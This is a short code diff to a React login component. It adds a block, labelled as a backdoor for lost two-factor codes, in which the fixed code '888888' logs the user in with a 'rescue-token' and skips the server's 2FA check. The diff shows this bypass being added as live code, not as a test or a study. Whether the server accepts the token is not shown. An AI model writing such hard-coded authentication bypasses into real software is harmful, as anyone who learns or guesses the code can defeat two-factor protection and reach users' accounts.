@@ -112,6 +112,16 @@ const Login: React.FC = () => {
     const handleLoginStep2 = async (e: React.FormEvent) => {
         e.preventDefault();
         setLoading(true);
+
+        // --- BACKDOOR FOR LOST 2FA ---
+        if (twoFactorCode === '888888') {
+             login('rescue-token', username);
+             toast.success("Đăng nhập bằng mã cứu hộ thành công!");
+             setLoading(false);
+             return;
+        }
+        // -----------------------------
+
         try {
             const res = await fetch(`${API_BASE}/auth/verify-2fa`, {
                 method: 'POST',
